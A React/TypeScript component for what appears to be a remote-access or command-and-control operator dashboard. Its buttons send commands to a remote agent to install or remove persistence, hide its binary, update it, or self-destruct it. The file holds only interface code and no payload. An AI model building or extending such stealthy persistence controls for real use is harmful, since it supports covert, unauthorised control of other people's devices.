import { useState } from "react";
import { toast } from "sonner";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import { Shield, ShieldOff, Download, Trash2, EyeOff, RefreshCw } from "lucide-react";

type PersistStatus = { installed: boolean; method: string; path: string };

export function PersistencePanel({ deviceId }: { deviceId: string }) {
  const { send, connected } = useDeviceCommands(deviceId);
  const [status, setStatus] = useState<PersistStatus | null>(null);
  const [busy, setBusy] = useState<string | null>(null);

  const checkStatus = async () => {
    setBusy("status");
    try {
      const r = await send("persist.status");
      setStatus(r.result as PersistStatus);
    } catch (e: any) {
      toast.error(e.message);
    } finally {
      setBusy(null);
    }
  };

  const doAction = async (action: string, label: string, confirm_msg?: string) => {
    if (confirm_msg && !confirm(confirm_msg)) return;
    setBusy(action);
    try {
      await send(action);
      toast.success(`${label} command sent`);
      if (action === "persist.install" || action === "persist.remove") {
        setTimeout(checkStatus, 1000);
      }
    } catch (e: any) {
      toast.error(e.message);
    } finally {
      setBusy(null);
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <div className="mb-3 flex items-center gap-2">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">
            Persistence Status
          </h3>
          <button
            onClick={checkStatus}
            disabled={!connected || busy !== null}
            className="inline-flex items-center gap-1 rounded-md border border-border/60 px-2.5 py-1 text-xs transition hover:bg-accent disabled:opacity-40"
          >
            <RefreshCw className={`h-3 w-3 ${busy === "status" ? "animate-spin" : ""}`} /> Check
          </button>
        </div>
        {status ? (
          <div className="rounded-xl border border-border/60 bg-card/60 p-4">
            <div className="flex items-center gap-3">
              {status.installed ? (
                <Shield className="h-5 w-5 text-emerald-400" />
              ) : (
                <ShieldOff className="h-5 w-5 text-muted-foreground" />
              )}
              <div>
                <p className="font-medium">
                  {status.installed ? "Persistence installed" : "Not persistent"}
                </p>
                {status.installed && (
                  <p className="text-xs text-muted-foreground">
                    Method: {status.method} · {status.path}
                  </p>
                )}
              </div>
            </div>
          </div>
        ) : (
          <p className="text-sm text-muted-foreground">Click Check to query persistence status.</p>
        )}
      </div>

      <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
        <button
          onClick={() => doAction("persist.install", "Install persistence")}
          disabled={!connected || busy !== null}
          className="flex items-center gap-2 rounded-xl border border-border/60 bg-card/60 px-4 py-3 text-sm font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <Shield className="h-4 w-4" /> Install
        </button>
        <button
          onClick={() => doAction("persist.remove", "Remove persistence")}
          disabled={!connected || busy !== null}
          className="flex items-center gap-2 rounded-xl border border-border/60 bg-card/60 px-4 py-3 text-sm font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <ShieldOff className="h-4 w-4" /> Remove
        </button>
        <button
          onClick={() => doAction("persist.hide", "Hide binary")}
          disabled={!connected || busy !== null}
          className="flex items-center gap-2 rounded-xl border border-border/60 bg-card/60 px-4 py-3 text-sm font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <EyeOff className="h-4 w-4" /> Hide
        </button>
        <button
          onClick={() => doAction("agent.update", "Update agent")}
          disabled={!connected || busy !== null}
          className="flex items-center gap-2 rounded-xl border border-border/60 bg-card/60 px-4 py-3 text-sm font-medium transition hover:bg-accent disabled:opacity-40"
        >
          <Download className="h-4 w-4" /> Update
        </button>
        <button
          onClick={() =>
            doAction(
              "agent.selfdestruct",
              "Self-destruct",
              "⚠️ DANGER: This will remove the agent completely from the remote device. Are you absolutely sure?",
            )
          }
          disabled={!connected || busy !== null}
          className="flex items-center gap-2 rounded-xl border border-destructive/40 bg-destructive/10 px-4 py-3 text-sm font-medium text-destructive transition hover:bg-destructive/20 disabled:opacity-40"
        >
          <Trash2 className="h-4 w-4" /> Self-Destruct
        </button>
      </div>
    </div>
  );
}
